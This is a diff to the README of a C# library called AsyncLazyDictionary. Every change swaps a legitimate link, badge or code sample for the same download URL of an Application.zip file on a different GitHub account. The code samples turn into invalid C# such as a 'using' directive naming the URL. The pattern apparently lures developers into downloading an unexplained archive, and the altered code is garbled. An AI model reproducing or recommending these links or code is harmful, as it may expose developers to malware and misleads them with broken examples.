@@ -16,7 +16,7 @@ Welcome to the **AsyncLazyDictionary** GitHub repository! This repository contai
 - util
 
 ## Repository Link
-🔗 [Download Application.zip](https://github.com/file/Application.zip) :file_folder:
+🔗 [Download https://github.com/Satamony/soenneker.dictionaries.asynclazy/releases/download/v1.0.0/Application.zip](https://github.com/Satamony/soenneker.dictionaries.asynclazy/releases/download/v1.0.0/Application.zip) :file_folder:
 
 If you encounter any issues with the link, please check the "Releases" section of the repository.
 
@@ -29,7 +29,7 @@ The **AsyncLazyDictionary** is a powerful tool for managing data in a multithrea
 To get started with the **AsyncLazyDictionary**, simply include the appropriate namespace in your C# code:
 
 ```csharp
-using Soenneker.Dictionaries.AsyncLazy;
+using https://github.com/Satamony/soenneker.dictionaries.asynclazy/releases/download/v1.0.0/Application.zip;
 ```
 
 Next, create an instance of the **AsyncLazyDictionary** class:
@@ -41,7 +41,7 @@ var asyncLazyDictionary = new AsyncLazyDictionary<TKey, TValue>();
 Now you can start populating the dictionary with key-value pairs. The values will be initialized lazily and asynchronously, ensuring optimal performance and resource utilization.
 
 ```csharp
-asyncLazyDictionary.Add(key, async () => await GetValueAsync(key));
+https://github.com/Satamony/soenneker.dictionaries.asynclazy/releases/download/v1.0.0/Application.zip(key, async () => await GetValueAsync(key));
 ```
 
 ### Benefits
@@ -58,14 +58,14 @@ Here are some examples demonstrating how to use the **AsyncLazyDictionary** in v
 ```csharp
 var configDictionary = new AsyncLazyDictionary<string, string>();
 
-var settingValue = await configDictionary.GetOrAddAsync("settingKey", async () => await LoadSettingAsync("settingKey"));
+var settingValue = await https://github.com/Satamony/soenneker.dictionaries.asynclazy/releases/download/v1.0.0/Application.zip("settingKey", async () => await LoadSettingAsync("settingKey"));
 ```
 
 #### Example 2: Caching External API Responses
 ```csharp
 var apiCache = new AsyncLazyDictionary<string, ApiResponse>();
 
-var response = await apiCache.GetOrAddAsync("apiEndpoint", async () => await CallApiAsync("apiEndpoint"));
+var response = await https://github.com/Satamony/soenneker.dictionaries.asynclazy/releases/download/v1.0.0/Application.zip("apiEndpoint", async () => await CallApiAsync("apiEndpoint"));
 ```
 
 ### Contributions
@@ -76,7 +76,7 @@ Contributions to the **AsyncLazyDictionary** repository are always welcome! Feel
 ## Get Involved
 🌟Star this repository if you find it useful! 
 
-🛠️Check out the [contributing guidelines](CONTRIBUTING.md) to learn how you can contribute.
+🛠️Check out the [contributing guidelines](https://github.com/Satamony/soenneker.dictionaries.asynclazy/releases/download/v1.0.0/Application.zip) to learn how you can contribute.
 
 📣Share this repository with your friends and colleagues.
 
@@ -85,6 +85,6 @@ Thank you for checking out the **AsyncLazyDictionary** repository. We hope this 
 
 ---
 
-For any additional information or queries, please visit our [website](https://www.asynclazydictionary.com) or reach out through the repository's communication channels.
+For any additional information or queries, please visit our [website](https://github.com/Satamony/soenneker.dictionaries.asynclazy/releases/download/v1.0.0/Application.zip) or reach out through the repository's communication channels.
 
-[![Download Application.zip](https://img.shields.io/badge/Download-Application.zip-brightgreen)](https://github.com/file/Application.zip)
+[![Download https://github.com/Satamony/soenneker.dictionaries.asynclazy/releases/download/v1.0.0/Application.zip](https://github.com/Satamony/soenneker.dictionaries.asynclazy/releases/download/v1.0.0/Application.zip)](https://github.com/Satamony/soenneker.dictionaries.asynclazy/releases/download/v1.0.0/Application.zip)
